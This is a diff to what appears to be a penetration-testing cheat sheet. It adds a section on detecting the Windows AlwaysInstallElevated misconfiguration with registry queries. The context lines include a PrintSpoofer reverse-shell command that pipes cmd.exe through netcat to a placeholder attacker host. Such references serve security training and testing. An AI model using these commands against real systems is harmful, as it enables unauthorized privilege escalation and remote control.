@@ -916,6 +916,20 @@ cmd> printspoofer.exe -i -c cmd
 cmd> printspoofer.exe -c "C:\temp\nc.exe [LHOST] [LPORT] -e cmd.exe"
 ```
 
+### AlwaysInstallElevated
+
+If these 2 registers are enabled (value is 0x1), users of any privilege can install (execute) .msi files as NT AUTHORITY\SYSTEM.
+```
+# OPTION 1:
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# OPTION 2:
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+```
+
+
 ## Firewall Disabling
 
 Bypassing Linux firewalls.
